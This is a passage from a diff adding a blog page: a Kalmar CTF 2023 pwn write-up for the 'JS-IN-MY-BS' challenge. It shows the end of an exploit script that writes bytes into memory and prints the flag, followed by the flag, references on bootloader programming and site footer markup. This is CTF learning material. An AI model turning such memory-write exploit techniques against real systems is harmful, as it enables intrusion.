class="string">&quot;little&quot;</span>),<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(part[<span class="number">1</span>:],<span class="string">&quot;little&quot;</span>)))</span><br><span class="line">    write_to_mem(part[<span class="number">0</span>].to_bytes(<span class="number">1</span>,<span class="string">&quot;little&quot;</span>),<span class="built_in">int</span>.from_bytes(part[<span class="number">1</span>:],<span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">send_js(<span class="string">b&quot;b(0)&quot;</span>)</span><br><span class="line">lp(io.recvuntil(<span class="string">b&quot;&#125;&quot;</span>))</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x7-flag"><a href="#0x7-flag" class="headerlink" title="0x7 flag"></a>0x7 flag</h1><p><code>kalmar&#123;this_would_be_a_nice_addon_to_all_efi_shells_right?&#125;</code></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://infosecwriteups.com/writing-a-bootloader-931da062f25b">https://infosecwriteups.com/writing-a-bootloader-931da062f25b</a></li>
+<li><a target="_blank" rel="noopener" href="https://medium.com/swlh/an-introduction-to-i386-boot-loader-programming-823354b80846">https://medium.com/swlh/an-introduction-to-i386-boot-loader-programming-823354b80846</a></li>
+<li><a target="_blank" rel="noopener" href="http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/">http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html">https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/INT_13H#INT_13h_AH=02h:_Read_Sectors_From_Drive">https://en.wikipedia.org/wiki/INT_13H#INT_13h_AH=02h:_Read_Sectors_From_Drive</a></li>
+</ol>
+
+      </div>
+      
+      
+      
+    </div>
+  <ul class="breadcrumb">
+            <li><a href="/ctf-writeup/">CTF-WRITEUP</a></li>
+            <li><a href="/ctf-writeup/2023/">2023</a></li>
+            <li><a href="/ctf-writeup/2023/kalmar/">KALMAR</a></li>
+            <li><a href="/ctf-writeup/2023/kalmar/pwn/">PWN</a></li>
+          <li>JS-IN-MY-BS</li>
+  </ul>
+
+    
+    
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Aynakeya</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
